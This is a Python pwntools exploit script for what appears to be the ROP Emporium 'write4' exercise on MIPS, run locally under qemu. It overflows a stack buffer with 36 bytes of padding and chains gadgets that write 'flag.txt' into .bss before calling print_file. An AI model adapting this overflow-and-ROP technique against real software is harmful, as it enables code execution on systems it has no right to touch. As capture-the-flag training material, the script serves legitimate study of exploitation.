from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)

copy_gadget = 0x00400930 # lw $t9, 0xc($sp); lw $t0, 8($sp); lw $t1, 4($sp); sw $t1, ($t0); jalr $t9; addi $sp, $sp, 0x10;
caller_gadget = 0x00400948 # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
print_file_addr = 0x00400a90 
bss = 0x00411000

def copy(address: int,data: bytes):
    chain = p32(copy_gadget)      
    next = copy_gadget
    for i in range(0,len(data),4):
        if i + 4 >= len(data):
            next = caller_gadget
        chunk = int.from_bytes(data[i:i+4].ljust(4,b"\x00"), "little")
        chain += p32(0)                # + 0
        chain += p32(chunk)            # + 4
        chain += p32(address + i)      # + 8
        chain += p32(next)             # + 0xc
    return chain


payload = b""
payload += b"A"*36
payload += copy(bss,b"flag.txt\x00")
payload += p32(0) + p32(print_file_addr) + p32(bss)
pause()
io.send(payload)
io.interactive()
